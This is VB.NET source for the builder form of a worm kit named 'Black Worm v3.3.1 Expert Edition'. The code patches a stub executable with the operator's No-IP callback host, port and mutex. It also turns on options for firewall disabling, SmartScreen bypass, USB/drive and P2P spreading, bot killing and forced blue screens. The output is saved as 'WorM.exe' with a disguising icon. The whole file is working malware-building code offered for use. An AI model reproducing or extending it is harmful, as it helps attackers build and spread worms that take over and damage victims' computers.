Imports System.ComponentModel
Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Public Class Form2
    Dim dialog As New SaveFileDialog
    Dim c As New OpenFileDialog
    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
        If Not File.Exists((Application.StartupPath & "\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found", MsgBoxStyle.Critical, Nothing)
        ElseIf (host.Text = "") Then
            Interaction.MsgBox("Add your No-IP", MsgBoxStyle.Critical, Nothing)
        Else
            Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString
                                        If (str = "[host]") Then
                                            current.Operand = host.Text
                                        Else
                                            If (str = "[port]") Then
                                                current.Operand = port.Text
                                            End If
                                            If (str = "[vn]") Then
                                                current.Operand = vn.Text
                                            End If
                                            If (str = "[link]") Then
                                                current.Operand = link.Checked.ToString
                                            End If
                                            If (str = "[startname]") Then
                                                current.Operand = getMD5Hash(File.ReadAllBytes(Application.StartupPath & "\" & "Stub.exe"))
                                            End If
                                            If (str = "[BSOD]") Then
                                                current.Operand = bsod.Checked.ToString
                                            End If
                                            If (str = "[exen]") Then
                                                current.Operand = exename.Text
                                            End If
                                            If (str = "[firewall]") Then
                                                current.Operand = FW.Checked.ToString
                                            End If
                                            If (str = "[Folder]") Then
                                                current.Operand = folder.Checked.ToString
                                            End If
                                            If (str = "[BypassScreening]") Then
                                                current.Operand = BypassSP.Checked.ToString
                                            End If
                                            If (str = "[EXE]") Then
                                                current.Operand = exe.Checked.ToString
                                            End If
                                            If (str = "[P2P]") Then
                                                current.Operand = P2P.Checked.ToString
                                            End If
                                            If (str = "[ShorCut]") Then
                                                current.Operand = shortcut.Checked.ToString
                                            End If
                                            If (str = "[Path]") Then
                                                current.Operand = PathS.Text
                                            End If
                                            If (str = "[BotKiller]") Then
                                                current.Operand = CheckBox1.Checked.ToString
                                            End If
                                            If (str = "[DriveSpread]") Then
                                                current.Operand = CheckBox3.Checked.ToString
                                            End If
                                            If (str = "[MUTEX]") Then
                                                current.Operand = TextBox2.Text
                                            End If
                                        End If
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Next
                Next
            Next
            With dialog
                .FileName = "WorM.exe"
                .Filter = "EXE Applications (*.exe)|*.exe"
                .Title = "Choose a place to save your server | Black Worm v3.3.1 Expert Edition"
            End With
            If dialog.ShowDialog = DialogResult.OK Then
                definition.Write(dialog.FileName)
                MsgBox("Your Worm Has been Created", vbInformation, "DONE!")
                Me.Close()
        End If
        If c.FileName = "" Then
                ' nothing
        Else
            IconChanger.InjectIcon(dialog.FileName, c.FileName)
        End If
        End If
    End Sub
    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        port.Text = Form1.k
    End Sub
    Public Function Randomisi(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function RandomNO(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1a2b3c4d5e"
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cicon.CheckedChanged
        If cicon.Checked = True Then
            With c
                .Title = "Choose icon | Black Worm"
                .Filter = "Icon File (*.ico)|*.ico"
                .ShowDialog()
            End With
            iconBox.ImageLocation = c.FileName
        Else
            cicon.Checked = False
        End If
    End Sub

    Private Sub TextBox2_MouseCaptureChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles TextBox2.MouseCaptureChanged

    End Sub

    Private Sub TextBox2_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles TextBox2.MouseMove
        TextBox2.Text = Randomisi(15)
    End Sub

    Private Sub TextBox2_Move(ByVal sender As Object, ByVal e As System.EventArgs) Handles TextBox2.Move
    End Sub

    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox2.TextChanged

    End Sub
End Class